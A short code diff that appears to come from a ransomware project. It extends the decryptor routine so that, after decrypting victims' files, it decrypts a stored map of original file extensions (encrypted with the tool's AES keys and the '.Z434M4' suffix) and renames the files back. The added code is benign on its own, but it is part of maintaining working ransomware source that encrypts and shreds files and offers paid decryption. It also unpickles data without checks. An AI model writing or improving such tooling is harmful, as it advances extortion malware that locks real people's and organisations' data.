@@ -168,6 +168,35 @@ def menu():
         # delete old encrypted file
         utils.shred(_[1])
 
+    # Look for the extensions file
+    extensions_file_path = os.path.join(ransomware_path, "file_extensions.dat.Z434M4")
+    if os.path.exists(extensions_file_path):
+        # Find its key in the aes_and_path list
+        for item in aes_and_path:
+            if extensions_file_path.encode('utf-8') in item[1]:
+                ext_key = item[0]
+                
+                # Decrypt the extensions file
+                with open(extensions_file_path, 'rb') as f:
+                    encrypted_ext_data = f.read()
+                    
+                dec = symmetric.AESCipher(ext_key)
+                decrypted_ext_data = dec.decrypt(encrypted_ext_data)
+                
+                # Load the extensions map
+                extensions_map = pickle.loads(decrypted_ext_data)
+                
+                # Restore all file extensions
+                for encrypted_path, original_ext in extensions_map.items():
+                    if os.path.exists(encrypted_path):
+                        try:
+                            # Rename to restore original extension
+                            file_base = os.path.splitext(encrypted_path)[0]
+                            os.rename(encrypted_path, file_base + original_ext)
+                            print(f"Restored extension for {file_base + original_ext}")
+                        except Exception as e:
+                            print(f"Error restoring extension for {encrypted_path}: {str(e)}")
+
     # end of decryptor
     print("{}Decryption finished!{}".format(GREEN, WHITE))
 
